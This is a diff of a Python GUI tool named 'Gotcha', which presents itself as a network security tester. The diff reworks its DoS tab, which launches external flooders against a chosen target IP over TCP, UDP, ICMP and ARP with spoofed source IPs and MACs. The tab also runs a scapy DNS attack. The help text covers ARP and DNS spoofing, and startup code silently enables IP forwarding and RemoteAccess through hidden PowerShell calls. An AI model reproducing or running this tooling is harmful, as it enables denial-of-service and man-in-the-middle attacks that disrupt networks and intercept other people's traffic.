+                        elapsed = data.get('time', 0)
+                        pps = data.get('pps', 0)
+                        packets = data.get('packets', 0)
+                        log_widget.insert('end', f"{elapsed}s: {pps} pps (total: {packets})\n")
+                        log_widget.see('end')
+                    else:
+                        log_widget.insert('end', line + '\n')
+                        log_widget.see('end')
+                except json.JSONDecodeError:
+                    log_widget.insert('end', line + '\n')
+                    log_widget.see('end')
+                if stop_event.is_set():
+                    if infinite and proc.poll() is None:
+                        try:
+                            proc.stdin.write('\n')
+                            proc.stdin.flush()
+                        except:
+                            pass
+                    else:
+                        proc.terminate()
+                    break
+            proc.wait()
+        except Exception as e:
+            log_widget.insert('end', f"External process error: {str(e)}\n")
+        finally:
+            self.external_processes.pop(process_key, None)
+            log_widget.insert('end', "External process finished.\n")
+            if on_finish:
+                self.root.after(0, on_finish)
+
     def run_external_tool(self, args, log_widget, stop_event, process_key, infinite=False, on_finish=None, stats_callback=None):
         try:
             if platform.system() == "Windows":
@@ -2410,162 +2145,26 @@ class Gotcha:
         self.custom_start_btn.config(state='disabled')
         self.custom_stop_btn.config(state='normal')
         try:
-            target_ip = self.custom_ip.get()
-            try:
-                socket.inet_pton(socket.AF_INET6, target_ip)
-                is_ipv6 = True
-            except socket.error:
-                is_ipv6 = False
-
+            target_ip = self.custom_ip.get().strip()
             protocol = self.custom_protocol.get()
             port = int(self.custom_port.get()) if protocol in ["TCP", "UDP"] else 0
-            packet_size = int(self.custom_packet_size.get())
+            packet_size = int(self.custom_packet_size.get()) if protocol not in ["ARP", "DNS"] else 0
             duration = int(self.custom_packet_count.get())
-            continuous = duration == 0
+            continuous = (duration == 0)
             interface = self.custom_interface.get()
             random_ip = self.custom_random_ip.get()
             random_mac = self.custom_random_mac.get()
+            dst_mac = self.custom_dst_mac.get().strip() if protocol != "DNS" else None
+
             if duration < 0:
                 raise ValueError("Время атаки не может быть отрицательным")
-            self.current_attack_type = protocol
-            self.external_infinite = continuous and protocol in ["TCP", "ARP", "ICMP", "UDP"] and not is_ipv6
-            self.custom_log.delete(1.0, tk.END)
-            self.custom_log.insert('end', f"{protocol} flood started\n")
-            self.custom_log.insert('end', f"Target: {target_ip}" + (f":{port}" if protocol in ["TCP","UDP"] else "") + "\n")
-            self.custom_log.insert('end', f"Interface: {interface}\n")
-            if protocol in ["TCP", "ARP", "ICMP", "UDP"] and not is_ipv6:
-                self.custom_log.insert('end', f"Random IP: {'yes' if random_ip else 'no'}, Random MAC: {'yes' if random_mac else 'no'}\n")
-            if protocol == "UDP":
-                if is_ipv6:
-                    self.raw_attack.start_udp_attack(
-                        target_ip, port, packet_size, duration, 
-                        continuous, interface, self._log_custom,
-                        on_complete=lambda: self.root.after(0, self.on_internal_finished)
-                    )
-                else:
-                    exe_path = find_exe("udp.exe")
-                    if not exe_path:
-                        self.custom_log.insert('end', "Error: udp.exe not found!\n")
-                        self.stop_custom_attack()
-                        return
-                    try:
-                        src_ip = get_if_addr(interface)
-                        if not src_ip or src_ip == '0.0.0.0':
-                            src_ip = "192.168.1.100"
-                    except:
-                        src_ip = "192.168.1.100"
-                    threads = 4
-                    args = [exe_path, src_ip, target_ip, str(port), str(threads), str(duration)]
-                    if random_ip:
-                        args.append("--random-ip")
-                    if random_mac:
-                        args.append("--random-mac")
-                    self.custom_stop_event = threading.Event()
-                    self.custom_external_thread = threading.Thread(
-                        target=self.run_external_tool,
-                        args=(args, self.custom_log, self.custom_stop_event, 'udp'),
-                        kwargs={'infinite': self.external_infinite, 'on_finish': self.on_external_finished},
-                        daemon=True
-                    )
-                    self.custom_external_thread.start()
-            elif protocol == "ICMP":
-                if is_ipv6:
-                    self.raw_attack.start_icmp_attack_ipv6(
-                        target_ip, packet_size, duration, continuous, interface,
-                        self._log_custom, on_complete=lambda: self.root.after(0, self.on_internal_finished)
-                    )
-                else:
-                    exe_path = find_exe("icmp.exe")
-                    if not exe_path:
-                        self.custom_log.insert('end', "Error: icmp.exe not found!\n")
-                        self.stop_custom_attack()
-                        return
-                    try:
-                        src_ip = get_if_addr(interface)
-                        if not src_ip or src_ip == '0.0.0.0':
-                            src_ip = "192.168.1.100"
-                    except:
-                        src_ip = "192.168.1.100"
-                    threads = 4
-                    args = [exe_path, src_ip, target_ip, str(threads), str(duration)]
-                    if random_ip:
-                        args.append("--random-ip")
-                    if random_mac:
-                        args.append("--random-mac")
-                    self.custom_stop_event = threading.Event()
-                    self.custom_external_thread = threading.Thread(
-                        target=self.run_external_tool,
-                        args=(args, self.custom_log, self.custom_stop_event, 'icmp'),
-                        kwargs={'infinite': self.external_infinite, 'on_finish': self.on_external_finished},
-                        daemon=True
-                    )
-                    self.custom_external_thread.start()
-            elif protocol == "TCP":
-                if is_ipv6:
-                    self.raw_attack.start_tcp_attack_ipv6(
-                        target_ip, port, packet_size, duration, continuous, interface,
-                        self._log_custom, on_complete=lambda: self.root.after(0, self.on_internal_finished)
-                    )
-                else:
-                    exe_path = find_exe("tcp.exe")
-                    if not exe_path:
-                        self.custom_log.insert('end', "Error: tcp.exe not found!\n")
-                        self.stop_custom_attack()
-                        return
-                    try:
-                        src_ip = get_if_addr(interface)
-                        if not src_ip or src_ip == '0.0.0.0':
-                            src_ip = "192.168.1.100"
-                    except:
-                        src_ip = "192.168.1.100"
-                    threads = 4
-                    args = [exe_path, src_ip, target_ip, str(port), str(threads), str(duration)]
-                    if random_ip:
-                        args.append("--random-ip")
-                    if random_mac:
-                        args.append("--random-mac")
-                    self.custom_stop_event = threading.Event()
-                    self.custom_external_thread = threading.Thread(
-                        target=self.run_external_tool,
-                        args=(args, self.custom_log, self.custom_stop_event, 'tcp'),
-                        kwargs={'infinite': self.external_infinite, 'on_finish': self.on_external_finished},
-                        daemon=True
-                    )
-                    self.custom_external_thread.start()
-            elif protocol == "ARP":
-                if is_ipv6:
-                    self.custom_log.insert('end', "Error: ARP не поддерживается для IPv6\n")
-                    self.stop_custom_attack()
-                    return
-                exe_path = find_exe("arp.exe")
-                if not exe_path:
-                    self.custom_log.insert('end', "Error: arp.exe not found!\n")
-                    self.stop_custom_attack()
-                    return
-                try:
-                    src_ip = get_if_addr(interface)
-                    if not src_ip or src_ip == '0.0.0.0':
-                        src_ip = "192.168.1.100"
-                except:
-                    src_ip = "192.168.1.100"
-                threads = 4
-                args = [exe_path, src_ip, target_ip, str(threads), str(duration)]
-                if random_ip:
-                    args.append("--random-ip")
-                if random_mac:
-                    args.append("--random-mac")
-                self.custom_stop_event = threading.Event()
-                self.custom_external_thread = threading.Thread(
-                    target=self.run_external_tool,
-                    args=(args, self.custom_log, self.custom_stop_event, 'arp'),
-                    kwargs={'infinite': self.external_infinite, 'on_finish': self.on_external_finished},
-                    daemon=True
-                )
-                self.custom_external_thread.start()
-            elif protocol == "DNS":
+            if protocol == "DNS":
+                # DNS атака через scapy
+                self.current_attack_type = "DNS"
+                self.external_infinite = False
                 self.scapy_attack.start_dns_attack(
                     target_ip, duration, continuous, interface, self._log_custom,
-                    on_complete=lambda: self.root.after(0, self.on_internal_finished)
+                    on_complete=lambda: self.root.after(0, self.on_dns_finished)
                 )
             if protocol in ["UDP", "DNS"]:
                 self.custom_attack_stats = {
@@ -2577,7 +2176,7 @@ class Gotcha:
                     'total_bytes': 0
                 }
                 self.update_custom_attack_stats()
-            elif (protocol in ["TCP", "ICMP"] and is_ipv6):
+            elif (protocol in ["TCP", "ICMP"] and socket.has_ipv6):
                 self.custom_attack_stats = {
                     'start_time': time.time(),
                     'sent_packets': 0,
@@ -2587,13 +2186,125 @@ class Gotcha:
                     'total_bytes': 0
                 }
                 self.update_custom_attack_stats()
+                self.status_var.set(f"DoS атака запущена: {protocol} → {target_ip}")
+                return
+
+            # Определяем exe и строим аргументы
+            if protocol == "TCP":
+                exe_name = find_exe("NPtcpT.exe")
+                # формат: src_ip dst_ip dst_port threads duration [dst_mac] [--random-ip] [--random-mac] [--packet-size bytes]
+                src_ip = self._get_source_ip(interface)
+                args = [exe_name, src_ip, target_ip, str(port), "8", str(duration)]
+                if dst_mac:
+                    args.append(dst_mac)
+                args.append("--packet-size")
+                args.append(str(packet_size))
+                if random_ip:
+                    args.append("--random-ip")
+                if random_mac:
+                    args.append("--random-mac")
+            elif protocol == "UDP":
+                exe_name = find_exe("NPudpT.exe")
+                src_ip = self._get_source_ip(interface)
+                args = [exe_name, src_ip, target_ip, str(port), "4", str(duration)]
+                if dst_mac:
+                    args.append(dst_mac)
+                args.append("--packet-size")
+                args.append(str(packet_size))
+                if random_ip:
+                    args.append("--random-ip")
+                if random_mac:
+                    args.append("--random-mac")
+            elif protocol == "ICMP":
+                exe_name = find_exe("NPicmpT.exe")
+                src_ip = self._get_source_ip(interface)
+                args = [exe_name, src_ip, target_ip, "4", str(duration)]
+                if dst_mac:
+                    args.append(dst_mac)
+                args.append("--packet-size")
+                args.append(str(packet_size))
+                if random_ip:
+                    args.append("--random-ip")
+                if random_mac:
+                    args.append("--random-mac")
+            elif protocol == "ARP":
+                if self._is_ipv6(target_ip):
+                    self.custom_log.insert('end', "Error: ARP не поддерживается для IPv6\n")
+                    self.stop_custom_attack()
+                    return
+                exe_name = find_exe("NParpT.exe")
+                src_ip = self._get_source_ip(interface)
+                args = [exe_name, src_ip, target_ip, "4", str(duration)]
+                if dst_mac:
+                    args.append(dst_mac)
+                if random_ip:
+                    args.append("--random-ip")
+                if random_mac:
+                    args.append("--random-mac")
+            else:
+                raise ValueError(f"Неизвестный протокол: {protocol}")
+
+            exe_path = find_exe(exe_name)
+            if not exe_path:
+                self.custom_log.insert('end', f"Error: {exe_name} not found!\n")
+                self.stop_custom_attack()
+                return
+
+            self.custom_log.delete(1.0, tk.END)
+            self.custom_log.insert('end', f"{protocol} flood started\n")
+            self.custom_log.insert('end', f"Target: {target_ip}" + (f":{port}" if protocol in ["TCP","UDP"] else "") + "\n")
+            self.custom_log.insert('end', f"Interface: {interface}\n")
+            if protocol in ["TCP", "UDP", "ICMP", "ARP"]:
+                self.custom_log.insert('end', f"Random IP: {'yes' if random_ip else 'no'}, Random MAC: {'yes' if random_mac else 'no'}\n")
+            if dst_mac:
+                self.custom_log.insert('end', f"Dest MAC: {dst_mac}\n")
+            if protocol not in ["ARP", "DNS"]:
+                self.custom_log.insert('end', f"Packet size: {packet_size} bytes\n")
+
+            self.current_attack_type = protocol
+            self.external_infinite = continuous
+            self.custom_stop_event = threading.Event()
+            self.custom_external_thread = threading.Thread(
+                target=self.run_external_tool,
+                args=(args, self.custom_log, self.custom_stop_event, protocol.lower()),
+                kwargs={'infinite': continuous, 'on_finish': self.on_external_finished},
+                daemon=True
+            )
+            self.custom_external_thread.start()
+
+            self.custom_attack_stats = {
+                'start_time': time.time(),
+                'sent_packets': 0,
+                'received_packets': 0,
+                'last_update': time.time(),
+                'last_sent': 0,
+                'total_bytes': 0
+            }
+            self.update_custom_attack_stats()
             self.status_var.set(f"DoS атака запущена: {protocol} → {target_ip}")
+
         except ValueError as e:
             messagebox.showerror("Ошибка", f"Некорректные параметры:\n{str(e)}")
             self.stop_custom_attack()
         except Exception as e:
             messagebox.showerror("Ошибка", f"Не удалось запустить атаку:\n{str(e)}")
             self.stop_custom_attack()
+
+    def _get_source_ip(self, interface):
+        try:
+            ip = get_if_addr(interface)
+            if ip and ip != '0.0.0.0':
+                return ip
+        except:
+            pass
+        return "192.168.1.100"
+
+    def _is_ipv6(self, ip):
+        try:
+            socket.inet_pton(socket.AF_INET6, ip)
+            return True
+        except socket.error:
+            return False
 
     def _log_custom(self, message):
         self.custom_log.insert('end', f"{message}\n")
@@ -2602,9 +2313,9 @@ class Gotcha:
     def _show_internal_results(self, final_stats):
         if not final_stats:
             return
-        total_packets = final_stats['total_sent']
-        total_bytes = final_stats['total_bytes']
-        total_time = time.time() - final_stats['start_time']
+        total_packets = final_stats.get('total_sent', 0)
+        total_bytes = final_stats.get('total_bytes', 0)
+        total_time = time.time() - final_stats.get('start_time', time.time())
         self.custom_log.insert('end', "\n--- Results ---\n")
         self.custom_log.insert('end', f"Total packets sent: {total_packets}\n")
         self.custom_log.insert('end', f"Duration: {total_time*1000:.0f} ms\n")
@@ -2614,16 +2325,10 @@ class Gotcha:
         if total_time > 0:
             self.custom_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")
 
-    def on_internal_finished(self):
-        if not self.custom_attack_running or self.current_attack_type not in ["UDP", "DNS", "TCP", "ICMP"]:
+    def on_dns_finished(self):
+        if not self.custom_attack_running:
             return
-        final_stats = None
-        if self.current_attack_type in ["UDP", "TCP", "ICMP"]:
-            with self.raw_attack.stats_lock:
-                final_stats = self.raw_attack.stats.copy()
-        elif self.current_attack_type == "DNS":
-            with self.scapy_attack.stats_lock:
-                final_stats = self.scapy_attack.stats.copy()
+        final_stats = self.scapy_attack.stop()
         self._show_internal_results(final_stats)
         self.custom_attack_running = False
         self.custom_start_btn.config(state='normal')
@@ -2637,11 +2342,17 @@ class Gotcha:
         self.custom_start_btn.config(state='normal')
         self.custom_stop_btn.config(state='disabled')
         self.status_var.set("DoS атака завершена")
+        self.current_attack_type = None
+        self.external_infinite = False
 
     def stop_custom_attack(self):
         if not self.custom_attack_running:
             return
-        if self.current_attack_type in ["TCP", "ARP", "ICMP", "UDP"]:
+        if self.current_attack_type == "DNS":
+            if self.scapy_attack.running:
+                final_stats = self.scapy_attack.stop()
+                self._show_internal_results(final_stats)
+        else:
             key = self.current_attack_type.lower()
             proc_info = self.external_processes.get(key)
             if proc_info:
@@ -2658,14 +2369,6 @@ class Gotcha:
                         proc.wait(timeout=1)
                     except subprocess.TimeoutExpired:
                         proc.kill()
-        if self.current_attack_type in ["UDP", "DNS", "TCP", "ICMP"]:
-            if self.raw_attack.running:
-                final_stats = self.raw_attack.stop()
-            elif self.scapy_attack.running:
-                final_stats = self.scapy_attack.stop()
-            else:
-                final_stats = None
-            self._show_internal_results(final_stats)
         self.custom_attack_running = False
         self.custom_start_btn.config(state='normal')
         self.custom_stop_btn.config(state='disabled')
@@ -2677,18 +2380,16 @@ class Gotcha:
         if not self.custom_attack_running:
             return
         current_time = time.time()
-        if self.raw_attack.running:
-            with self.raw_attack.stats_lock:
-                sent_packets = self.raw_attack.stats['total_sent']
-                rate = self.raw_attack.stats['current_pps']
-                self.custom_rate.config(text=f"{rate}")
-        elif self.scapy_attack.running:
+        if self.current_attack_type == "DNS" and self.scapy_attack.running:
             with self.scapy_attack.stats_lock:
                 sent_packets = self.scapy_attack.stats['total_sent']
+                rate = 0  # DNS не показывает pps
+                self.custom_rate.config(text=f"{rate}")
         else:
-            sent_packets = 0
+            # Для внешних exe статистика обновляется через callback, здесь просто показываем отправленные пакеты
+            sent_packets = self.custom_attack_stats.get('sent_packets', 0)
         self.custom_sent.config(text=f"{sent_packets}")
-        duration = current_time - self.custom_attack_stats['start_time']
+        duration = current_time - self.custom_attack_stats.get('start_time', current_time)
         hours = int(duration // 3600)
         minutes = int((duration % 3600) // 60)
         seconds = int(duration % 60)
@@ -2696,7 +2397,7 @@ class Gotcha:
         if self.custom_attack_running:
             self.root.after(1000, self.update_custom_attack_stats)
 
-    # -------------------- Intercept tab (unchanged) --------------------
+    # -------------------- Intercept tab --------------------
     def setup_intercept_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -2982,7 +2683,7 @@ class Gotcha:
             self.intercept_log.insert('end', f"Ошибка создания ответа: {str(e)}\n")
         return None
 
-    # -------------------- Settings tab (unchanged) --------------------
+    # -------------------- Settings tab --------------------
     def setup_settings_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
@@ -3025,6 +2726,7 @@ class Gotcha:
         help_notebook.add(general_frame, text="Общая информация")
         general_text = """Gotcha – Инструмент для тестирования сетевой безопасности
 https://github.com/hedromanie
+
 ТРЕБОВАНИЯ:
 • Права администратора
 • Windows 10 21h2+ или Linux (с адаптацией)
@@ -3033,6 +2735,9 @@ https://github.com/hedromanie
 • Для поиска уязвимостей рекомендуется Nmap / Zenmap GUI
 • Советую также для обучения Metasploit Framework или Kali Linux / BlackArch
 
+Если у вас не работает Dos Атака :
+Проверьте наличие установленного Npcap
+Или 
 
 Если у вас не работает ARP spoofing / Происходит конфликт ip-адрессов / Жертва не может достучаться до шлюза
 Откройте Powershell и впишите данные команды
@@ -3130,8 +2835,7 @@ Start-Service RemoteAccess
 6. DNS SPOOFING
    • Перехватывает DNS-запросы и подменяет ответы.
    • Позволяет перенаправлять трафик на заданный IP-адрес.
-   • Поддерживает маски доменов (например, *.example.com) и catch-all правило.
-   • Полезен для тестирования фишинга, родительского контроля."""
+   • Поддерживает маски доменов (например, *.example.com) и catch-all правило."""
         attacks_txt = scrolledtext.ScrolledText(attacks_frame, wrap=tk.WORD, font=('Consolas', 9))
         attacks_txt.pack(fill='both', expand=True, padx=10, pady=10)
         attacks_txt.insert('1.0', attacks_text)
@@ -3158,7 +2862,6 @@ Start-Service RemoteAccess
    • Полезна для диагностики сетевых настроек.
 5. Сетевые адаптеры
    • Показывает все доступные сетевые интерфейсы (имена, IP-адреса, MAC-адреса).
-   • Использует библиотеку scapy для получения информации.
 6. Сканировать сеть
    • Выполняет ARP-сканирование локальной сети /24 (на основе введённого IP).
    • Отправляет ARP-запросы на все адреса подсети.
@@ -3220,11 +2923,11 @@ def main():
         except:
             pass
         return
-    # Execute PowerShell commands to enable IP forwarding and start RemoteAccess
+    # Включение IP forwarding и RemoteAccess
     try:
-        subprocess.run(["powershell", "-Command", "Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\" -Name \"IPEnableRouter\" -Value 1"], capture_output=True)
-        subprocess.run(["powershell", "-Command", "Set-Service RemoteAccess -StartupType Automatic"], capture_output=True)
-        subprocess.run(["powershell", "-Command", "Start-Service RemoteAccess"], capture_output=True)
+        subprocess.run(["powershell", "-Command", "Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\" -Name \"IPEnableRouter\" -Value 1"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["powershell", "-Command", "Set-Service RemoteAccess -StartupType Automatic"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["powershell", "-Command", "Start-Service RemoteAccess"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
     except:
         pass
     root = tk.Tk()
